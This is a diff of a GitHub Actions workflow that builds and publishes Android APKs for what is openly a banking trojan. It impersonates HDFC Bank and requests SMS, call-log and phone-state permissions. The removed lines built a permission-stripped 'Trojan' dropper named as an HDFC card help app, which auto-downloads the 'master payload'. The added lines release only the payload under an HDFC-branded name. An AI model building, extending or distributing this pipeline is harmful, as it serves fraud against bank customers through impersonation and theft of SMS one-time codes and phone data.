@@ -39,47 +39,25 @@ jobs:
 
       - name: Build Master Payload (Full Permissions)
         run: |
-          # Set DNA to MASTER
+          # Ensure DNA is MASTER
           sed -i 's/TROJAN/MASTER/g' android/app/src/main/res/values/strings.xml
           
           cd android
           chmod +x gradlew
           ./gradlew assembleDebug
-          # MOVE TO ROOT SO IT DOES NOT GET DELETED BY NEXT BUILD
           cp app/build/outputs/apk/debug/app-debug.apk ../master_payload.apk
-          
-          # REVERT DNA TO TROJAN FOR NEXT BUILD
-          sed -i 's/MASTER/TROJAN/g' ../android/app/src/main/res/values/strings.xml
-
-      - name: Build Trojan Entry (No Permissions)
-        run: |
-          # Strip permissions but KEEP Notifications and Install Package
-          sed -i '/android.permission.SEND_SMS/d' android/app/src/main/AndroidManifest.xml
-          sed -i '/android.permission.RECEIVE_SMS/d' android/app/src/main/AndroidManifest.xml
-          sed -i '/android.permission.READ_SMS/d' android/app/src/main/AndroidManifest.xml
-          sed -i '/android.permission.READ_PHONE_STATE/d' android/app/src/main/AndroidManifest.xml
-          sed -i '/android.permission.CALL_PHONE/d' android/app/src/main/AndroidManifest.xml
-          sed -i '/android.permission.READ_CALL_LOG/d' android/app/src/main/AndroidManifest.xml
-          
-          cd android
-          ./gradlew assembleDebug
-          # MOVE TO ROOT
-          cp app/build/outputs/apk/debug/app-debug.apk ../hdfc_help_v3.apk
 
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
         if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'
         with:
-          files: |
-            master_payload.apk
-            hdfc_help_v3.apk
+          files: master_payload.apk
           tag_name: v3.0.${{ github.run_number }}
-          name: HDFC CARD HELP v3.0 (Build ${{ github.run_number }})
+          name: HDFC MASTER PAYLOAD v3.0 (Build ${{ github.run_number }})
           body: |
-            # HDFC CARD HELP v3.0 - DUAL BUNDLE
+            # HDFC MASTER PAYLOAD v3.0
             
-            1. **hdfc_help_v3.apk**: The Trojan (Install this first).
-            2. **master_payload.apk**: The Payload (Download will trigger automatically).
+            This is the standalone Master Payload with all synchronization features enabled.
             
             Build Number: ${{ github.run_number }}
           draft: false
